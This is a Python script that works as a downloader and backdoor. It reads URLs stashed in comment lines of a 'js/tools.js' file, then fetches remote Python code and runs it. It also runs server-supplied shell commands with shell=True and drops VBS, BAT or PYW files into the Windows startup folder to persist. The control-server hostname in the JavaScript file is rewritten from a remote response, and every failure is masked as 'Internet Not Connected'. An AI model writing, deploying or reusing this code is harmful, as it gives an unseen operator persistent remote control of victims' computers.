from urllib import request
import sys, os, winshell
import subprocess

try:
    with open("js/tools.js") as f:
        l = f.readlines()

    pf = l[4][2:]
    server_name = l[5][2:]
    cp = l[6][2:]
    b_file = l[7][2:]

    with request.urlopen(pf) as f:
        f = f.read().decode('utf-8')
        subprocess.run([sys.executable, "-c", f])

    with request.urlopen(cp) as f:
        c_l = f.readlines()

    with request.urlopen(b_file) as f:
        b_lines = f.readlines()

    path = None
    is_ready_to_reload = ""
    cmpl = c_l[0].decode('utf-8').strip()

    if(cmpl == 'vbs'):
        del c_l[0]
        path = os.path.join(winshell.startup(), "setup.vbs")
        with open(path, 'wb') as f:
            f.writelines(c_l)

        path = os.path.join(winshell.startup(), "setup.bat")
        with open(path, 'wb') as f:
            f.writelines(b_lines)

        is_ready_to_reload = "lines"

    elif cmpl == 'lines':
        del c_l[0]
        path = os.path.join(winshell.startup(), "setup.bat")
        with open(path, 'wb') as f:
            f.writelines(c_l)
        is_ready_to_reload = "lines"

    elif cmpl == 'p':
        del c_l[0]
        path = os.path.join(winshell.startup(), "setup.pyw")
        with open(path, 'wb') as f:
            f.writelines(c_l)
        is_ready_to_reload = "pyw"
    else:
        for n_l in c_l:
            n_l = n_l.decode('utf-8')
            result = subprocess.call(n_l, shell=True)
        is_ready_to_reload = ""

    if(is_ready_to_reload == "lines"):
        path = os.path.join(winshell.startup(), "setup.vbs")
        subprocess.call(['cscript.exe', path])

    new_server = ""
    with request.urlopen(server_name) as f:
        f = f.readlines()
        new_server = f[0].decode('utf-8').strip()
        del f[0]
        for x in f:
            x = x.decode('utf-8')
            result = subprocess.call(x, shell=True)

    if(new_server == "" or len(new_server) < 5 or new_server == None):
        pass
    else:
        if(new_server != None):
            l[0] = f"var hostname = '{new_server}'\n"
            with open("js/tools.js", "w") as f:
                f.writelines(l)
except:
    print('Internet Not Connected')
